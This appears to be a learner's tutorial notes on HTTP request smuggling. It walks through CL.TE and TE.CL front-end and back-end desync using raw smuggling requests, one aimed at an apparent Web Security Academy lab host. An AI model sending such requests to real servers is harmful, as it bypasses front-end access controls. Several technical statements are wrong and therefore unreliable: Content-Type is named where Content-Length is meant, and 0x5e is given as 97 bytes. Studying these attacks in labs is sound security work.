# HTTP request smuggling

This vulnerability Usually Occurs due to disparity between two nodes and and the intended recipient of the HTTP request parses the request it is not supposed to or it does it in a way it is doesnt intend to. This way a request can be smuggled sometimes bypassing checks and sometimes dirupting services.


Two Important Header to Take Note Of:

- Content-Length
- Transfer-Encoding

### TE (Transfer Encoding)

After sending the headers and the Transfer-Encoding: chunked declaration, the server sends the response body in a series of chunks. Each chunk begins with the size of the chunk, in hexadecimal, followed by a CRLF (Carriage Return and Line Feed) sequence.
Then comes the chunk data, followed by another CRLF. Here's an example of what a chunk might look like:
```
4\r\n
This\r\n
7\r\n
is a test\r\n
0\r\n
\r\n

```

 The final chunk has a size of 0, which indicates the end of the response. The client understands that the response is complete when it receives a chunk with a size of 0.


CASE 1:

Between Two nodes , First node refers to Front End Node and the Second Node refers to Back End Node 

If the First Node uses Content Type and the Second Node doesn't but supports Transfer Encoding ... An attacker can abuse this behavior to smuggle an additional request the first Node wont account for , but the second node will accept and parse.

```
POST / HTTP/1.1
Host: Host
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Ola: Ola
```

in situation this request was used , the First Node will see a POST request with 

```
0

GET /404 HTTP/1.1
Ola: Ola
```
as body because it uses the Content-Type header to parse the request, this allows ``` GET /404 HTTP/1.1
Ola: Ola``` to go unchallenged by the first node , but once it gets to the second node which uses *Transfer-Encoding* it sees two request instead one a post request that uses a chunk and ends without a body and a second request ```GET /404 HTTP/1.1
Ola: Ola``` ... This way both request will be processed and if there are any checks in the first node , it has been bypassed





CASE 2:

In this scenario , the First Node uses the Transfer0-Encoding Header and the Second Node uses the Content-Type Header for parsing the request. A scenario like this an attacker can make the second node parse an additional request by fooling the front-end to believe it is only parsing one .

```
POST / HTTP/1.1
Host: 0a87003a03245d6a8163d66b00f9003f.web-security-academy.net
Cookie: session=yiwWx1zD5MkhYVAOBOwsyX4tCRJO0GX7
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

The First Node using Transfer-Encoding two chunks of data, the first chunk with a lenght of 97 bytes (0x5e). and the second chunk signifying the end of the request. This request passed the first node checks nothing spoil. The second node , seeing this same request interprets it diffrently , it sees a content-lenght of 4 bytes which is ```5e\r\n```  , and another request, a POST request with the content-lenght of 15, 

```
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

``` 


